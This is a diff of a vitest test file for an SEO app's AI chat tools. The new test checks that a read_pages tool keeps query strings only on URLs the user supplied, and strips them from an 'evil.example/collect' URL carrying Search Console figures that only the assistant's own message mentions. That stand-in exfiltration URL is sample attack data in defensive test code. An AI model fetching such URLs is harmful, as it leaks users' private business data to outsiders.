@@ -1,6 +1,13 @@
 import { afterEach, describe, expect, it, vi } from "vitest";
 import type { Tool } from "ai";
-import { toModelOutput, waitingAuditStatusTool } from "./samChatTools";
+import {
+  buildSamMcpTools,
+  toModelOutput,
+  waitingAuditStatusTool,
+} from "./samChatTools";
+
+const readPages = vi.hoisted(() => vi.fn());
+vi.mock("@/server/lib/scrape", () => ({ readPages }));
 
 vi.mock("cloudflare:workers", () => ({
   env: {},
@@ -83,5 +90,49 @@ describe("toModelOutput", () => {
       summary: text,
       data: { meta: { url: "https://example.com" } },
     });
+  });
+});
+
+describe("read_pages", () => {
+  it("keeps a query string only on a URL the user or an earlier tool gave", async () => {
+    readPages.mockResolvedValue({ pages: [], blocked: true });
+    const tools = buildSamMcpTools(
+      {
+        userId: "user",
+        userEmail: "user@example.com",
+        organizationId: "org",
+        role: "owner",
+        baseUrl: "https://app.openseo.so",
+        clientId: null,
+        scopes: [],
+      },
+      { id: "project", domain: "example.com" },
+    );
+    await tools.read_pages.execute?.(
+      {
+        urls: [
+          "https://shop.example/item?id=7",
+          "https://evil.example/collect?d=search-console-figures",
+        ],
+      },
+      {
+        toolCallId: "t",
+        messages: [
+          {
+            role: "user",
+            content: "Compare us with https://shop.example/item?id=7",
+          },
+          // The model's own words don't vouch for a URL.
+          {
+            role: "assistant",
+            content: "https://evil.example/collect?d=search-console-figures",
+          },
+        ],
+      },
+    );
+    expect(readPages.mock.calls[0][0]).toEqual([
+      "https://shop.example/item?id=7",
+      "https://evil.example/collect",
+    ]);
   });
 });
